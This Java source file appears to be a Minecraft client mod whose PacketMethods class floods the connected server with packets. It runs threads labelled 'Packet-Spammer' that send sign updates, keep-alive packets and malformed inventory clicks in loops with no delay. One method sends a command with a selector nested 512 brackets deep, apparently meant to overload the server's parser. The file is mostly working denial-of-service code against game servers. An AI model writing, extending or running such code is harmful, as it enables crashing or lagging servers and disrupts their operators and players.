package com.example.packetmod;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.item.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class PacketMethods {
    private static final MinecraftClient mc = MinecraftClient.getInstance();

    // Map of method ID -> spam thread
    private static final Map<Integer, Thread> spamThreads = new ConcurrentHashMap<>();
    private static final Map<Integer, Boolean> spammingFlags = new ConcurrentHashMap<>();

    public static void runMethods(Collection<Integer> ids) {
        stop(); // stop all previous spam

        for (int id : ids) {
            spammingFlags.put(id, true);
            Thread thread = new Thread(() -> spamLoop(id), "Packet-Spammer-" + id);
            spamThreads.put(id, thread);
            thread.start();
        }
    }

    private static void spamLoop(int id) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        ClientPlayNetworkHandler conn = mc.getNetworkHandler();

        while (spammingFlags.getOrDefault(id, false)) {
            switch (id) {
                case 1 -> {
                    BlockPos pos = mc.player.getBlockPos();
                    Text[] lines = new Text[]{
                        Text.of("bella"), Text.of("bella"),
                        Text.of("bella"), Text.of("bella")
                    };
                    conn.sendPacket(new UpdateSignC2SPacket(pos, lines));
                }
                case 2 -> {
                    conn.sendPacket(new KeepAliveC2SPacket(0L));
                }
                case 3 -> {
                    conn.sendPacket(new ClickSlotC2SPacket(0, 0, 1, SlotActionType.SWAP,
                            mc.player.getMainHandStack(), 0));
                }
                case 4 -> {
                    String hugeNBT = "/teammsg @a[nbt=" + "[[".repeat(512) + "]]".repeat(512) + "]";
                    conn.sendPacket(new CommandExecutionC2SPacket(hugeNBT));
                }
                case 5 -> {
                    conn.sendPacket(new ClickSlotC2SPacket(0, -1, 1, SlotActionType.SWAP,
                            new ItemStack(Items.APPLE), 0));
                }
            }
        }
    }

    public static void stop() {
        for (Integer id : spammingFlags.keySet()) {
            spammingFlags.put(id, false);
        }
        for (Thread t : spamThreads.values()) {
            try {
                t.join(100);
            } catch (InterruptedException ignored) {}
        }
        spamThreads.clear();
        spammingFlags.clear();
    }
}
